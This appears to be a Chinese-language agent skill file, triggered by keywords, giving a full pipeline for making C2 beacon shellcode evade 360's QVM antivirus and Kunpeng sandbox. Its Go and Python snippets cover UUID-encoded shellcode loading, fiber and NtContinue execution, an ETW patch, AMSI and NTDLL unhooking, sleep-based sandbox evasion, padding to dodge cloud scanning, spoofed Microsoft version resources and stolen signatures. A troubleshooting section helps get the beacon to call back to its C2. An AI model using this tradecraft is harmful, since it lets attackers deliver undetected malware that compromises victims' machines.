# 360 QVM 免杀专项技术

当用户明确提到"免杀360"、"过QVM"、"360绕过"、"360天擎"等关键词时，切换到本技术栈。

---

## 触发词

`360`、`QVM`、`天擎`、`360安全卫士`、`360终端安全`、`鲲鹏沙箱`、`QVM AI引擎`

## 核心策略

QVM 是 AI 分类模型（非传统特征码），看的是 **7 维整体特征分布**。单靠加密/混淆不够，必须从每一维对抗。

**技术栈组合：UUID 编码 + Fiber Injection + IAT 欺骗 + Overlay 注水 + PE 元数据修复 + 强化反沙箱 + ETW/AMSI/NTDLL 脱钩**

---

## QVM 7 维特征与对抗措施

| 维度 | 权重 | 检测内容 | 对抗措施 | 实现位置 |
|------|------|---------|---------|---------|
| **F1** 字节 N-gram | 28.6% | 全文件 2/3/4/6/8-gram TF-IDF | **Overlay 注水**：编译后在 EXE 尾部追加 200KB+ 合法软件字节（如 MRT.exe 尾部），稀释恶意特征 | 编译后 Python 处理 |
| **F2** 节区熵值 | 19.3% | 各节 Shannon 熵 + 8-bin 直方图 | **UUID 编码**：shellcode 转为 `XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX` 格式，全部 hex+短横线，熵值极低 | Go 源码（UUID 数组） |
| **F3** 导入表指纹 | 18.7% | DLL/API 名 FNV-1a 哈希 + 64×64 调用序共现矩阵 | **IAT 欺骗**：加载 10 个冗余 DLL（comctl32/msimg32/version/winmm/gdi32/user32/shell32/ole32/advapi32/ws2_32），稀释 DLL 名分布 | Go 源码 `fn_iat()` |
| **F4** CFG 嵌入 | 12.5% | 函数 CFG Node2Vec 向量 | Go 编译天然多函数 + 防御模块拆分（ETW/AMSI/脱钩/反沙箱/IAT 各独立函数） | 天然满足 |
| **F5** PE 结构 | 8.2% | 节区数量/入口点权限/.reloc | Go 编译器默认不在异常范围 | — |
| **F6** 资源节 | 7.1% | RT_ICON/RT_VERSION/RT_MANIFEST 存在性 | **资源注入**：编译后通过 rcedit/ResourceHacker 添加图标 + manifest + 版本信息（无资源节直接提升恶意评分） | 编译后工具处理 |
| **F7** 元数据 | 5.6% | TimeDateStamp/LinkerVersion/CheckSum | **PE 元数据修复**：TimeDateStamp → `0x62C3B8E5`(2022-07-04 VS2019)、LinkerVersion → 14.0 | 编译后 Python 处理 |

---

## 流程概览

**执行方式：** `<python命令> <skill_dir>/scripts/build_qvm.py <shellcode.bin>`

```
beacon.bin
    │
    ▼
[清理残留 .go/.exe]      ← 删除 result/*.go、result/*.exe
    │
    ▼
[Python UUID 编码]       ← 端序预修正（Data1/2/3 预翻转）
    │
    ▼
[Go 源码动态生成]        ← UUID 数组 + Fiber + IAT欺骗 + 反沙箱 + ETW/AMSI/脱钩
    │
    ▼
[go build]               ← -trimpath -ldflags="-s -w -H windowsgui"
    │
    ▼
[Overlay 注水]           ← 从合法 PE（MRT.exe尾部）取 300KB 追加到 EXE 末尾
    │
    ▼
[PE 元数据修复]          ← TimeDateStamp + LinkerVersion 改为 VS2019 合法范围
    │
    ▼
[可选: 资源注入]         ← rcedit 添加图标 + manifest + 版本信息（F6 对抗）
    │
    ▼
[可选: 大文件逃逸]       ← 填充到 >100MB 绕过云查杀全量上传
    │
    ▼
beacon_qvm_padded.exe
```

---

## 关键技术细节

### 1. UUID 编码（F2 对抗核心）

shellcode 每 16 字节一块 → UUID 字符串。全部 hex + 短横线格式，QVM 分类为"正常配置数据"。

**端序陷阱（关键！）：**

Windows `UuidFromStringA` 写入内存时对 Data1(4B)/Data2(2B)/Data3(2B) 做 little-endian 转换。在 Python 编码时必须预翻转：

```python
# 预翻转 Data1(0-3) / Data2(4-5) / Data3(6-7)
chunk[0], chunk[3] = chunk[3], chunk[0]
chunk[1], chunk[2] = chunk[2], chunk[1]
chunk[4], chunk[5] = chunk[5], chunk[4]
chunk[6], chunk[7] = chunk[7], chunk[6]
```

Go 运行时调用 `UuidFromStringA`（**ANSI 版本**，必须用 `BytePtrFromString` 而非 `UTF16PtrFromString`）：

```go
u8, _ := syscall.BytePtrFromString(uuidStr)
syscall.SyscallN(pUuidFromStringA, uintptr(unsafe.Pointer(u8)), ptr)
```

### 2. IAT 欺骗（F3 对抗）

加载但不使用以下 DLL，将 IAT 中 DLL 名 FNV-1a 哈希从集中的 2-3 个分散到 10+ 个：

```
comctl32.dll, msimg32.dll, version.dll, winmm.dll, gdi32.dll,
user32.dll, shell32.dll, ole32.dll, advapi32.dll, ws2_32.dll
```

所有 DLL 名字符串 XOR 编码，运行时解码后 `syscall.LoadLibrary` 加载。

### 3. Overlay 注水（F1 对抗）

编译后 EXE 尾部追加 200KB-2MB 合法软件字节。推荐来源：微软签名的大型 EXE/DLL 尾部（如 `C:\Windows\System32\MRT.exe`）。

```python
with open('C:/Windows/System32/MRT.exe', 'rb') as f:
    f.seek(-300_000, 2)
    overlay = f.read()
padded = exe + overlay
```

### 4. PE 元数据修复（F7 对抗）

Go 编译器默认 TimeDateStamp=0、LinkerVersion=3.0，直接被 QVM 标记异常。

```python
# TimeDateStamp → 0x62C3B8E5 (2022-07-04, VS2019 范围)
struct.pack_into('<I', data, pe_offset + 8, 0x62C3B8E5)
# LinkerVersion → 14.0 (VS2019)
data[optional_header_offset + 2] = 14
data[optional_header_offset + 3] = 0
```

### 5. 反沙箱（鲲鹏沙箱对抗）

鲲鹏沙箱超时 60-90 秒，分配资源有限。

**A. 环境检测（默认阈值）：**

| 检测项 | 阈值 | 原理 |
|--------|------|------|
| CPU 核心 | ≥ 1 | 沙箱通常 1 核，但部分已升级 |
| 物理内存 | ≥ 2GB | 沙箱通常分配 1-2GB |
| uptime | ≥ 15s | 沙箱刚启动就执行样本 |
| 磁盘 C: | ≥ 60GB | 沙箱磁盘通常很小 |

**B. 延时绕过（直接绕过沙箱超时）：**

鲲鹏沙箱超时 60-90 秒，Sleep 120 秒即可确保分析环境已退出：

```go
// 方式1: 直接 Sleep（简单有效）
syscall.SyscallN(pSleep, 120000)

// 方式2: 分段 Sleep + 伪装计算（更隐蔽）
for i := 0; i < 120; i++ {
    syscall.SyscallN(pSleep, 1000)
    _ = i * 0x1337  // 伪装在计算
}
```

⚠️ 延时 120 秒对用户体验影响很大，默认关闭。仅在确信目标环境有沙箱分析时启用。

### 6. 执行方式

**A. Fiber Injection（默认，不走 CreateThread）：**

```
ConvertThreadToFiber(0) → CreateFiber(0, shellcode_addr, 0) → SwitchToFiber(fiber)
```

**B. NtContinue 跳板（备选，手册 6.2 节）：**

通过 ETW Patch 静默事件上报，然后用 `NtContinue` 直接设置 RIP/RSP 跳转到 shellcode。不经过 CreateThread/QueueUserAPC/SetThreadContext 等被监控 API，内核直接恢复执行上下文。

```
EtwEventWrite → ret (patch)
VirtualProtect(EtwEventWrite, RWX) → *(BYTE*)EtwEventWrite = 0xC3
→ NtContinue(&Context)
    // Context.Rip = shellcode_addr
    // Context.Rsp = stack_addr
    // Context.EFlags = 0x202
```

**需要的 SyscallN 参数：**
- ntdll.NtContinue(PCONTEXT, BOOLEAN) → 2 参数

⚠️ NtContinue 作为备选方案，Fiber 优先。

### 7. 运行时防护（保留）

ETW Bypass + AMSI Bypass + NTDLL 脱钩，与其他模式共用，实现见 `references/defense-modules.md`。

### 8. 编译后包装（F6 + 云查杀对抗）

QVM 云查杀会检测文件 Hash、签名有效性，并对 < 100MB 文件全量上传分析。

**A. 大文件逃逸（绕过云查杀上传）：**

云查杀全量上传阈值通常 < 100MB。将 EXE 填充到 > 100MB 可绕过全量上传：

```bash
# Windows CMD: 生成 150MB 空数据追加到 EXE
fsutil file createnew junk.dat 157286400
copy /b result/beacon.exe + junk.dat result/beacon_big.exe
```

```python
# Python 跨平台
with open('result/beacon.exe', 'rb') as f:
    exe = f.read()
padding = b'\x00' * (150 * 1024 * 1024)
with open('result/beacon_big.exe', 'wb') as f:
    f.write(exe + padding)
```

⚠️ 150MB+ 文件传输不便，默认不启用。仅在需要对抗云查杀时使用。

**B. 资源注入（F6 对抗）：**

Go 编译默认无 .rsrc 节（无图标、无 manifest、无版本信息），QVM 直接标记异常。

使用 `rcedit` 或 `ResourceHacker` 添加资源：

```bash
# rcedit — 轻量资源编辑器（推荐）
rcedit.exe result/beacon.exe ^
  --set-icon icon.ico ^
  --set-version-string "FileDescription" "Windows Update Service" ^
  --set-version-string "ProductName" "Microsoft Windows Operating System" ^
  --set-version-string "CompanyName" "Microsoft Corporation" ^
  --set-version-string "LegalCopyright" "(c) Microsoft Corporation" ^
  --set-version-string "OriginalFilename" "svchost.exe" ^
  --set-file-version "10.0.19041.1"
```

```bash
# ResourceHacker — 完整资源编辑器
ResourceHacker.exe -open result/beacon.exe -save result/beacon_res.exe ^
  -action addskip -res icon.ico -mask ICONGROUP,MAINICON,
```

⚠️ rcedit 需要预先下载到 `tools/` 目录。资源注入作为可选步骤，默认执行 Overlay 注水（F1 权重更高）。

**C. 签名窃取（文件信誉对抗）：**

从合法微软签名文件窃取数字签名（sigthief.py）：

```bash
python sigthief.py C:\Windows\System32\notepad.exe result/beacon.exe
```

⚠️ 签名窃取仅改变文件信誉分，不影响 QVM AI 判定。且需要 Python 脚本，默认不集成。

---

## 编译后处理优先级

按 F 维度权重排序，默认执行前两项：

| 步骤 | 对抗维度 | 权重 | 默认 | 说明 |
|------|---------|------|------|------|
| Overlay 注水 | F1 | 28.6% | ✅ 必做 | 从 MRT.exe 尾部取 300KB |
| PE 元数据修复 | F7 | 5.6% | ✅ 必做 | TimeDateStamp + LinkerVersion |
| 大文件逃逸 | 云查杀 | — | ⬜ 可选 | 填充到 >100MB |
| 资源注入 | F6 | 7.1% | ⬜ 可选 | 需 rcedit 工具 |
| 签名窃取 | 信誉 | — | ⬜ 可选 | 需 sigthief.py |

---

## 常见问题

| 现象 | 原因 | 解决 |
|------|------|------|
| 不上线 + 无任何反应 | 反沙箱阈值过高 | 降低 CPU/内存阈值，或暂时注释反沙箱排查 |
| 不上线 + 有进程 | UUID 端序错误 或 A/W 版本混淆 | 确认 Python 预翻转 + Go 用 `BytePtrFromString`（A 版 API） |
| QVM 仍报毒 | Overlay 不够或来源不当 | 增加 overlay 到 500KB+，换用不同合法软件源 |
| 云查杀报毒 | 文件 Hash 被上传 | 启用大文件逃逸（填充到 >100MB） |
| 360 直接杀 | 熵值太高（加密 shellcode 熵 > 7.5） | 检查是否用 UUID 编码替代 AES+XOR 加密 |
| 双击没反应 | 反沙箱拦截 | 调低 uptime/CPU/内存阈值 |
| QVM 报 HEUR/QVM202 | F1/F2/F3 综合特征异常 | Overlay 注水不足 + 未启用 IAT 欺骗 |
| QVM 报 HEUR/QVM10 | 云查杀判定 | 启用大文件逃逸 + 考虑签名窃取 |

## 三层定位排查法（手册 10.1 节）

排查不上线问题时按以下顺序逐层验证：

```
test_raw.exe (裸执行,有控制台)
  ├─ 上线 → shellcode 没问题, 问题在加载器层
  └─ 不上线 → shellcode/C2 有问题
       ├─ 检查 C2 监听器是否开启
       ├─ 检查 shellcode 架构 (x64?)
       ├─ 检查 shellcode 类型 (Stager? Stageless?)
       └─ 检查 UUID 端序

loader.exe (加载器层,无反沙箱)
  ├─ 上线 → 问题在反沙箱或包装层
  └─ 不上线 → 问题在 UUID 解码或 Fiber 执行
       ├─ 检查 BytePtrFromString vs UTF16PtrFromString
       ├─ 检查 VirtualAlloc 返回地址非 0
       └─ 检查 UuidFromStringA 返回值

final_padded.exe (完整包装)
  ├─ 上线 → 全部正常
  └─ 不上线 → Overlay 或元数据修复破坏 PE 结构
       └─ 检查 EXE 是否仍为有效 PE（verify_pe.py）
```
